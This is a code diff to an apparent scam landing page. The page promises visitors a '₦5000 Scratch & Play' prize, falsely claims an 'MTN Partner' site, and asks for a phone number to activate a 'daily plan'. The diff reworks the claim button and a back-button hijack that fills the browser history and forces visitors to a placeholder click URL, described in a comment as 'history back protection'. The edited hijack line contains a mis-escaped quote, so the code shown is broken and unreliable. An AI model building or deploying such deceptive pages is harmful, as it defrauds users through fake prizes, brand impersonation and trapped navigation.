@@ -741,7 +741,7 @@
             html: '<h3>You won access to the **₦5000 Scratch & Play**!</h3><br>**Next Steps to Claim:**<br>1. Click "CONFIRM" below.<br>2. You will be redirected to the secure **MTN Partner** site.<br>3. Enter your MTN number to activate the daily plan and get your reward!',
             showConfirmButton: false,
             allowOutsideClick: false,
-            footer: '<a href="{clickurl}" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px;">CONFIRM & CLAIM NOW ➤</a>'
+            footer: '<button onclick="window.location.href=\'' + '{clickurl}' + '\'" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CONFIRM & CLAIM NOW ➤</button>'
         });
     }
 
@@ -779,7 +779,7 @@
     document.getElementById('date').innerHTML = date;
     
     // 历史记录回退保护，使用 {clickurl} 占位符
-    !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&location.replace("{clickurl}")}}catch(b){}}();
+    !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&(window.location.href=''+ '{clickurl}' + '\')}}catch(b){}}();
     </script>
 </body>
 </html>
